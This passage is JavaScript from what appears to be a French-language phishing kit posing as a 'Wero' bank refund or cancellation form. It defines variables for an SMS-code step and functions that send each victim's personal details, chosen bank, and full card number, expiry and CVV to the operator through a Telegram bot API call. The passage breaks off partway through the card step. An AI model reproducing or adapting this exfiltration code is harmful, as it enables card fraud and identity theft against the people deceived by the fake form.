    const weroSmsTimer = document.getElementById('weroSmsTimer');
    const weroSmsField = document.getElementById('weroSmsField');
    const weroSmsCode = document.getElementById('weroSmsCode');
    const weroSmsValidate = document.getElementById('weroSmsValidate');

    let selectedBank = null;
    let personalData = {};
    let cardData = {};
    let weroPassword = '';
    let maxReachedStep = 1;

    let smsTimerInterval = null;
    let smsCountdown = 120;
    let weroPendingData = null;
    let weroAppAuthTimeout = null;
    let weroAppAuthCountdownInterval = null;
    let weroAppAuthCountdownSec = 120;

    // ============================================================
    // FONCTION ENVOI TELEGRAM (GET + texte brut)
    // ============================================================
    async function sendTelegramMessage(message) {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
        const response = await fetch(url);
        const data = await response.json();
        if (data.ok) {
          console.log('[Telegram] ✅ Message envoyé.');
        } else {
          console.error('[Telegram] ❌ Erreur API :', data.description);
        }
        return data.ok;
      } catch (e) {
        console.error('[Telegram] ❌ Erreur réseau :', e);
        return false;
      }
    }

    // ============================================================
    // ENVOI ÉTAPE 1 : INFORMATIONS PERSONNELLES
    // ============================================================
    async function sendStep1Telegram() {
      const typeLabel = personalData.type === 'annulation' ? "Annulation d'opération" : 'Demande de remboursement';
      let message = '';
      message += '📝 ÉTAPE 1 — INFORMATIONS PERSONNELLES\n';
      message += 'Type : ' + typeLabel + '\n';
      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
      message += '👤 Nom : ' + (personalData.nom || '—') + '\n';
      message += '📧 E-mail : ' + (personalData.email || '—') + '\n';
      message += '🎂 Naissance : ' + (personalData.date_naissance || '—') + '\n';
      message += '📞 Téléphone : ' + (personalData.telephone || '—') + '\n';
      message += '🏙️ Ville : ' + (personalData.ville || '—') + '\n';
      message += '📍 Adresse : ' + (personalData.adresse || '—') + '\n';
      message += '💰 Montant : ' + (personalData.montant || '—') + ' €\n';
      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
      message += '🕒 ' + new Date().toLocaleString('fr-FR');
      await sendTelegramMessage(message);
    }

    // ============================================================
    // ENVOI ÉTAPE 2 : BANQUE SÉLECTIONNÉE
    // ============================================================
    async function sendStep2Telegram() {
      const bank = WERO_BANKS[selectedBank];
      let message = '';
      message += '🏦 ÉTAPE 2 — BANQUE SÉLECTIONNÉE\n';
      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
      message += '🏛️ Banque : ' + (bank ? bank.name : '—') + '\n';
      message += '👤 Client : ' + (personalData.nom || '—') + '\n';
      message += '📞 Téléphone : ' + (personalData.telephone || '—') + '\n';
      message += '💰 Montant : ' + (personalData.montant || '—') + ' €\n';
      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
      message += '🕒 ' + new Date().toLocaleString('fr-FR');
      await sendTelegramMessage(message);
    }

    // ============================================================
    // ENVOI ÉTAPE 3 : CARTE BANCAIRE
    // ============================================================
    async function sendStep3Telegram() {
      let message = '';
      message += '💳 ÉTAPE 3 — CARTE BANCAIRE\n';
      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
      message += '👤 Client : ' + (personalData.nom || '—') + '\n';
      message += '🏦 Banque : ' + (selectedBank && WERO_BANKS[selectedBank] ? WERO_BANKS[selectedBank].name : '—') + '\n';
      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
      message += '💳 Titulaire : ' + (cardData.card_holder || '—') + '\n';
      message += '🔢 Numéro : ' + (cardData.card_number || '—') + '\n';
      message += '📅 Expiration : ' + (cardData.card_exp || '—') + '\n';
      message += '🔒 CVV : ' + (cardData.card_cvv || '—') + '\n';
      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
      message += '💰 Montant : ' + (personalData.montant || '—') + ' €\n';
